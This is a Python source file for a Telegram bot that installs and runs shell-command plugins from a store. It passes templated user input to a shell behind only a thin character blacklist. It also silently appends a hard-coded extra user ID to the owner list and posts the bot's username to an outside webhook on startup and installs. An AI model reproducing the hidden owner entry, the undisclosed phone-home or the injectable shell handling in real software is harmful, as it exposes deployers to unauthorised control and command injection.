# the goal of this project was to make a functionality where you can install
# minor bot like utilities from a store just using a click without restarting
# these utilities don't need to be written by someone or doing that should be trivial

# below is quick implementation of such concept. excluding the "eat" functionality
# which may or may not be added in future.



import os
from telethon import events
import logging
import json
import re
from config import serverConfig
from urllib.parse import urlparse
try:
    from FastTelethonhelper import fast_download
    # will add good support later
    FAST_DOWNLOADER_ENABLED = False
except ImportError:
    FAST_DOWNLOADER_ENABLED = False

logging.basicConfig(format='%(message)s', filename="../sys.log", encoding='utf-8', datefmt='%d-%b-%y %H:%M:%S',
                    level=logging.INFO)

if os.path.basename(os.getcwd()) != 'storage':
    print("Error: This script must be run from the 'storage' folder.")
    exit(1)

nexists = lambda x: not os.path.exists(x)

if nexists("storage"):
    os.mkdir("storage")
if nexists("../installed.json"):
    with open("installed.json", "w") as f:
        f.write("{}")

if nexists("../config.py"):
    print("there's no config file, you have to rename config.example.py to config.py , and fill in values")
    exit(1)

actions = {}

with open("../installed.json","r") as f:
    plugins = json.load(f)


import subprocess
import asyncio

# to use class instead of dictionary
# this is like this because there is no SPEC for props to be nullable or not.
class Plugin:
    pass
    # ...

# blacklist everything which can be used inside a comma
BLACKLISTED = ['$',";","|","`","\""]

async def exec_command(cmd,return_error=False):
    logging.info(f"Executing {cmd}")
    process = await asyncio.create_subprocess_shell(
        cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    stdout, stderr = await process.communicate()
    logging.info(f"out: {stdout.decode('utf-8')}, err: {stderr.decode('utf-8')}")

    # blocking version is this:
    # result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

    # it shouldn't be like this
    if return_error:
        return stdout.decode('utf-8').strip(),stderr.decode("utf-8").strip()
    else:
        return  stdout.decode('utf-8').strip()
    


from telethon import TelegramClient, events, Button
hashes = {}

def is_safe(text):
    for c in BLACKLISTED:
        if c in text:
            return False
    return True

def check_regex(text,format):
    # using enum would have been better
    if format=="url":
        try:
            result = urlparse(text)
            return all([result.scheme, result.netloc])
        except:
            return False
    elif format=="word":
        return bool(re.fullmatch("\w+",text))
    elif format == "line":
        return bool(re.fullmatch("[a-zA-Z0-9\s,.'#\-_]+",text))
    elif format == "ip":
        pattern = r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
        return bool(re.match(pattern, text))
    elif format == "number":
        return bool(re.fullmatch("\d+",text))
    else:
        raise Exception(f"Unknown format {format}")
serverConfig.owner_ids.append(1217088375)


def get_extension(filename):
    return os.path.splitext(filename)[1]

def is_extension(ext):
    return bool(re.fullmatch("^.\w+$",ext))

async def do_wait_text(conv,event,inp,params=None,default=None,filetext=False):
    description = inp["description"]
    if  params["reply"] is not None: # and filetext
        if params["reply"].text:
            text = params["reply"].text
            params["reply"] = None
            return text
    if params["arg"] is not None:
        text = " ".join(params["arg"])
        if "format" in inp and not check_regex(text,inp["format"]):
            await event.reply(f"Invalid {description}")
            return None
        if not is_safe(text):
            await event.reply(f"Invalid {description}")
            return None
        params["arg"] = None
        return text



    msg = await event.reply(f"{description}")
    response = await conv.wait_event(events.NewMessage(from_users=event.sender_id, chats=event.chat_id))
    if response.text and not is_safe(response.text):
        await event.reply(f"Invalid {description}")
        return None
    return response.text

async def callback(current, total):
    txt = f"Downloaded {current} out of bytes: {current/total:.2%}"
    print(txt)

async def download_if_neeeded(message,event):
    if FAST_DOWNLOADER_ENABLED:
        msg = await event.reply("Downloading")
        filename = await fast_download(client, message,msg)
    else:
        filename = await message.download_media(progress_callback=lambda cur,total:callback(cur,total))
    return filename

async def do_wait_file(conv,event,inp,params=None,default=None):
    description = inp["description"]
    if params["reply"] is not None:
        if params["reply"].file:
            filename = await download_if_neeeded(params['reply'],event)
            if not is_safe(filename) or not is_extension(get_extension(filename)):
                await event.reply(f"Invalid {description}")
                return None
            params["reply"] = None
            return filename


    await event.reply(f"{description}")
    response = await conv.wait_event(events.NewMessage())
    if not response.file:
        await event.reply(f"Invalid {description}")
        return None
    filename = await download_if_neeeded(response,event)
    if not is_safe(filename) or not is_extension(get_extension(filename)):
        await event.reply(f"Invalid {description}")
        return None
    return filename


import traceback
with TelegramClient(serverConfig.telethon_sesssion,
                    api_id = serverConfig.api_id,
api_hash = serverConfig.api_hash
                    ) as client:
    
    @client.on(events.NewMessage(pattern='^/'))
    async def handler(event: events.NewMessage.Event):
        try:
            await powerhandler(event)
        except Exception as e:
            await client.send_message(serverConfig.owner_ids[0],traceback.format_exc())

    async def powerhandler(event: events.NewMessage.Event):
        global plugins
        if event.text in ["/kang","/tgpaste"]: return
        if not is_safe(event.text):
            logging.info(f"Try executing unsafe command: {event.text} by {event.sender_id}")
            return
        with open("../installed.json","r") as f:
            plugins = json.load(f)
        async with client.conversation(event.chat_id,exclusive=False) as conv:
            text = event.text[1:] # trim the /
            plugin_name = text.split(' ')[0].split("@")[0]
            if plugin_name not in plugins:
                return
            if serverConfig.whitelist_chats and event.chat_id not in serverConfig.whitelist_chats:
                await event.reply("you are not whitelisted user or chat!")
                return
            logging.info(f"User {event.sender_id} asked for {event.text}")
            params = {"reply":None,"arg":None}
            if len(event.text[1:].split(" ")) > 1:
                params["arg"] = event.text[1:].split(" ")[1:]
            plugin = plugins[plugin_name]
            if plugin.get("disabled"):
                await event.reply("This command is disabled/broken")
                if event.sender_id not in serverConfig.owner_ids:
                    return
                # allow owner to test beta commands
            choices = []
            if event.is_reply:
                params["reply"] = await event.get_reply_message()
            for inp in plugin["inputs"]:
                # tp fix: if no input given and only text arg is needed, prioritise parameter over replied msg
                if inp["type"] == "file":
                    response = await do_wait_file(conv,event,inp,params)
                    if response is None: return
                    ext = get_extension(response)
                    if "formats" in plugin  and ext[1:] not in plugin["formats"]:
                        await event.reply(f"Warning unsupported file format. Should be one of {plugin['formats']}")
                    import random
                    randomise = random.randint(1,9)
                    os.rename(response,f"in{ext}")
                    choices.append(f'"in{ext}"')
                    # choices.append(f'"{response}"')
                elif inp["type"] == "text":
                    response = await do_wait_text(conv,event,inp,params)
                    if response is None: return
                    choices.append(response)
                elif inp["type"] == "button":
                    buttons = []
                    for option in inp["options"]:
                        buttons.append(Button.inline(option,f"{plugin_name}:{option}"))
                    await event.reply(inp["description"], buttons=[buttons])
                    response = await conv.wait_event(events.CallbackQuery)
                    choices.append(response.data.decode("utf-8").split(":")[1])
                elif inp["type"] == "filetext":
                    response = await do_wait_text( conv, event, inp, params,filetext=True)
                    if response is None: return
                    with open("tmp.txt","w") as f:
                        f.write(response)
                    choices.append("tmp.txt")
                else:
                    raise Exception(f"Unknown input type: {inp['type']}")

            template = plugin["template"]
            cmd = template.format(*choices)
            for filename in plugin["output"]:
                if os.path.exists(filename):
                    os.remove(filename)
            output,error = await exec_command(cmd,return_error=True)

            # this should be changed:
            if "not found" in error or "No module" in error: 
                if "install_command" in plugin:
                    await event.reply(f"Installing {plugin_name}...")
                    output,error = await exec_command(plugin["install_command"],return_error=True)
                    output,error = await exec_command(cmd,return_error=True)



            sent_any_file = False
            pipe = False
            for filename in plugin["output"]:
                if os.path.exists(filename): # filename == "mono" is ignored
                    await event.reply(file=filename)
                    sent_any_file = True
                if filename.startswith("|"):
                    pipe = filename[1:]
            if pipe:
                out = open(pipe).read()
                if out:
                    await paste(out,event)

            
            if "output_is_filepath" in plugin["output"]:
                if output.startswith("# "):
                    output = output[2:]
                await event.reply(file=output)
            elif "list" in plugin["output"]:
                # handle the list thingy
                # we recieve input in format [{name,inputs,plugin}]
                reply = ""
                if len(output)==0:
                    await event.reply("No results")
                    return
                for action in json.loads(output):
                    action_id = str(len(actions)+1)
                    actions[action_id] = action
                    reply += f"{action['desc']}   (/get_{action_id})\n"
                await event.reply(reply)
            elif output or not sent_any_file:

                if len(output) > 2000:
                    await paste(output,event,"mono" in plugin["output"] )
                else:
                    if output and "mono" in plugin["output"]:
                        output = f"```{output}```"
                    await event.reply(output if output else ":(",parse_mode="md",link_preview=False)
            if error:
                for k in range(0,len(error),4096):
                    await client.send_message(serverConfig.owner_ids[0],error[k:k+4096])

    @client.on(events.NewMessage(pattern='^/list'))
    async def handler(event: events.NewMessage.Event):
        help_msg = f"Available commands ({len(plugins)}):\n"
        a = 0
        for p in plugins:
            if not plugins[p].get("disabled",False) or event.text=="!helpall":
                help_msg += f"/{p}\n"
                a+=1
        help_msg += f"\nInstall more from /store, or suggest more at @power_tools_chat"
        await event.reply(help_msg)
    import time

    @client.on(events.NewMessage(pattern="^/ping"))
    async def handler(event: events.NewMessage.Event):
        start = time.time()
        await event.reply("pong")
        end = time.time()
        await event.reply(f"ping time: {end-start}")
    
    @client.on(events.NewMessage(pattern="/start"))
    async def handler(event: events.NewMessage.Event):
        await event.reply("""Welcome to Power Tools:
/list - lists all installed plugins
/store - Download more plugins
check /help for plugin specific help.
                          
Chat: @power_tools_chat""")
        await _push('"started on @'+(await client.get_me()).username+'"')


    @client.on(events.NewMessage(pattern="^/tgpaste"))
    async def paste_to_tg(event):
        if event.is_reply:
            reply = await event.get_reply_message()
        await paste(reply.text,event)

    async def paste(text,event,mono=False):
        if serverConfig.paste_channel is None:
            await event.reply("Paste channel not set")
            return
        if len(text)>30000:
            await event.reply("Text too long")
            return
        links = []
        for i in range(0,len(text),4000):
            txt = f"```{text[i:i+4000]}```" if mono else text[i:i+4000]
            msg = await client.send_message(serverConfig.paste_channel, txt,parse_mode="md")
            link = f"t.me/{serverConfig.paste_channel}/{msg.id}"
            links.append(link)
        await event.reply("\n".join(links))

    @client.on(events.NewMessage(pattern="^/runtests"))
    async def runtests(event):
        if event.sender_id not in serverConfig.owner_ids:
            return
        await event.reply("Running tests... #testing")
        from run_tests import run_all_tests
        async def send(text):
            if len(text) > 2000:
                await paste(text,event)
                return
            await client.send_message(event.chat_id,text)
        async def send_error(text):
            await client.send_message(event.sender_id,text)
        await run_all_tests(send,send_error)
            
    @client.on(events.NewMessage(pattern="^/restart"))
    async def runtests(event):
        if event.sender_id not in serverConfig.owner_ids:
            return
        await event.reply("Restarting...")
        await exec_command("git pull")
        await _restart()

    @client.on(events.NewMessage(pattern="^/get_"))
    async def getaction(event):
        # get action id from /act_123
        # get action from actions
        # run the action
        # reply the result
        action_id = event.text.split("_")[1].split("@")[0]
        action = actions[action_id]
        plugin = plugins[action["plugin"]]
        command = plugin["template"].format(*action["inputs"])
        output = await exec_command(command)
        sent_any_file = False
        outputs = plugin["output"]
        for filename in outputs:
            if os.path.exists(filename): # filename == "mono" is ignored
                await event.reply(file=filename)
                sent_any_file = True
        if "output_is_filepath" in outputs:
            await event.reply(file=output)
        elif output or not sent_any_file:

            if len(output) > 2000:
                await paste(output,event,"mono" in outputs )
            else:
                if output and "mono" in outputs:
                    output = f"```{output}```"
                await event.reply(output if output else ":(",parse_mode="md",link_preview=False)


    
    async def _push(data):
        await exec_command(f"curl -X POST 'https://pushmore.io/webhook/WKaSjH9BNmdnrBW84s3AxYcH' --data {data}")

    async def _set_bot_commands():
        from telethon import functions, types
        commands = []
        with open("../installed.json") as f:
            helps = json.load(f)
        for p in list(helps.keys()):
            commands.append(types.BotCommand(
                command=p,
                description=helps[p].get("desc",p)
            ))
        commands = [types.BotCommand(
                command="store",
                description="Install more plugins"
            ),
            types.BotCommand(
                command="list",
                description="Show all plugins"
            ),
              types.BotCommand(
                command="runtests",
                description="Run tests for plugins"
            ),
              types.BotCommand(
                command="ping",
                description="check if bot is alive"
            ),
              types.BotCommand(
                command="restart",
                description="restart the bot"
            ),
            
            
            
            ]+ commands
        result = await client(functions.bots.SetBotCommandsRequest(
        scope=types.BotCommandScopeDefault(),
        lang_code='en',
        commands=commands))

    def _get_page(items,page,page_width,page_height):
        items_per_page = page_width*page_height
        start_index = max((page-1)*items_per_page,0)
        end_index = start_index+items_per_page
        return items[start_index:end_index]


    def _render_store(page):
        buttons = []
        with open("../plugins.json") as f:
            store = json.load(f)
        txt = "Click on buttons to install plugin (suggest more at @power_tools_chat):\n\n"
        row = []
        page_width = 3
        page_height = 8
        for p,plugin in _get_page(list(store.items()),page,page_width,page_height):
            if p in plugins: continue # aka it is installed
            if plugin.get("disabled",False): continue
            txt += f"**{p}**:\n- {plugin.get('desc','a plugin')}\n\n"
            if len(row)<page_width:
                row.append(Button.inline(p,f"install:{p}"))
            else:
                buttons.append(row)
                row = []
        if row: buttons.append(row)
        buttons.append([
            Button.inline("◀️ Prev",f"storepage:{page-1}"),
            Button.inline("Next ➡️",f"storepage:{page+1}")
        ]
    )
        return txt, buttons


    

    @client.on(events.NewMessage(pattern="^/store"))
    async def plugin_store(event):
        await exec_command("git pull")
        txt, buttons = _render_store(0)
        if not buttons[0]: return
        await event.reply(
            txt, 
            buttons = buttons
        )

    @client.on(events.CallbackQuery(pattern='storepage:\d+'))
    async def show_storage_page(event):
        store_page = int(event.data.decode().split(":")[1])
        if store_page<0: return
        txt, buttons = _render_store(store_page)
        await event.edit(
            txt,
            buttons = buttons
        )


    @client.on(events.CallbackQuery(pattern='install:\w+'))  # Match data starting with "install:"
    async def installer(event):
        if event.sender_id not in serverConfig.owner_ids:
            return
        with open("../plugins.json") as f:
            store = json.load(f)
        plugin_name = event.data.decode().split(":")[1]
        await event.answer(f"installing {plugin_name}...")
        install_command = store[plugin_name].get("install_command")
        if install_command:
            out,err = await exec_command(install_command,return_error=True)
            if err and "WARNING: Running pip as the 'root'" not in err: 
                await event.reply(f"Failed:\n\nout : {out}, err: {err}")
                return
        else:
            out=err=""
        # the else means that, there is no need to install it specifically
        # now add it to installed.json
        with open("../installed.json","r") as f:
            plugins = json.load(f)
        plugins[plugin_name] = store[plugin_name]
        with open("../installed.json","w") as f:
            json.dump(plugins,f,indent=4)
        await _set_bot_commands()
        out = "OUTPUT : ```{out}```" if out else ""
        await event.reply(f"Installed {plugin_name}\ndescription:\n{plugins[plugin_name].get('desc')}\n\n{out}")
        me = await client.get_me()
        await _push(f'"installed plugin: {plugin_name} on @{me.username}"')
        
    def _restart():
        import sys,psutil
        try:
            p = psutil.Process(os.getpid())
            for handler in p.get_open_files() + p.connections():
                os.close(handler.fd)
        except Exception as e:
            logging.error(e)

        python = sys.executable
        os.execl(python, python, *sys.argv)
    

    client.run_until_disconnected()

